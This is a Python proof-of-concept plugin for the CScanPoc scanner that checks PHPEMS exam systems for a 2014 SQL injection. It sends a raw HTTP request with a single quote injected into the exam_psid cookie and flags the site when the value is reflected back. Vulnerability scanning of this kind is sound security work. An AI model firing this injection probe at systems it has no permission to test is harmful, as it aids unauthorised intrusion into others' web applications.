# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPEMS_0012'  # 平台漏洞编号，留空
    name = 'PHPEMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-17'  # 漏洞公布时间
    desc = '''
        PHPEMS(PHP Exam Management System)在线模拟考试系统基于PHP+Mysql开发,支持多种题型和展现方式,是国内首款支持题冒题和手自动一体评分的PHP在线模拟考试系统。
        使用本系统，您可以快速搭建用于模拟考试的网站平台，实现无纸化考试、真实考场模拟、知识强化练习等功能。可满足培训机构、学校、公司等机构各种考试需求。
        任意找了一个进入数据库的地方，
        没有做任何过滤就进入数据库了。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1551/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPEMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd2c07055-2ef9-4c72-a135-b4f9ebf0bbd0'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            o = urllib.parse.urlparse(self.target)
            host = o.hostname
            raw = """
POST /index.php?exam-app-basics-openit HTTP/1.1
Host: {host}
Proxy-Connection: keep-alive
Content-Length: 79
Origin: {url1}
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer: {url2}/index.php?exam-app-basics-detail&basicid=4
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Cookie: exam_psid=c6f1b7acd452e6d72a3ede0f501a9211'; exam_currentuser=%25B4%2585%258B%2585%25CE%25BE%258D%257C%2586%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C8%25BE%25B8%25BD%25BC%25AFu%2586%25C6%2585%2585%2585u%2581%258Bm%258E%25BE%258D%257C%2588%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C3%25AC%25C6%25BE%25CA%25BA%25C5%25AFu%2586%25C6%2585%2586%257D%258Dm%258C%2581%25B8%2582%258C%257D%2584%2583%258C%2581%2588%25B0%25B5%2582%2585%25AE%258C%257D%25B4%2580%2587%2584%25B7%25AF%2588%25AC%2586%257E%2583%257C%2584%257Du%2586%25C6%2585%258C%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25BC%25BBu%2586%25C6%2585%258C%2585u%257C%2585%2582%2581%257B%2581%257B%2581%257Cu%2586%25C6%2585%2584%257F%258Dm%25C6%25B0%25C6%25BE%25BC%25BA%25C1%25B2%25C5%25BA%25C8%25BB%25BC%25AFu%2586%25C6%2585%2584%2585u%2583u%2586%25C6%2585%2584%2581%258Dm%25C6%25B0%25C6%25BE%25BC%25BA%25C1%25B7%25C2%25B2%25BC%25B9%25C7%25B4%25C0%25B0u%2586%25BC%2585%2584%257E%258B%2584%2588%257C%2589%2582%258B%257E%258E%25BE%258D%257C%2588%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C8%25BE%25B8%25BD%25C1%25AC%25C0%25B0u%2586%25C6%2585%2589%2585u%257C%2584%257C%2584%257C%2584m%258E%25BE%258D%257C%2589%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C7%25B4%25C0%25B0%25BF%25B4%25C0%25B4%25C7m%258E%25B4%258D%257C%2586%2583%258C%2580%2584%2581%258A%2583%2586%2586%25C6%2585%258C%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25BC%25AFu%2586%25C6%2585%2586%257D%258Dm%25B6%2581%25B9%257C%25B5%2582%25B4%25AE%25B7%257F%2588%257D%25B8%2581%25B7%2582%2585%25AC%2586%25B0%25B7%25B0%2583%25B1%2588%257B%2584%25AC%258C%257D%2584%257Cu%2586%25D0; CNZZDATA5243664=cnzz_eid%3D2105242747-1389515449-%26ntime%3D1389515449%26cnzz_a%3D3%26sin%3Dnone%26ltime%3D1389515448225
            """.format(host=host, url1=self.target, url2=self.target)

            code, head, res, err, _ = hh.http(self.target, raw=raw)
            if code == 200 and "c6f1b7acd452e6d72a3ede0f501a9211" in res.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
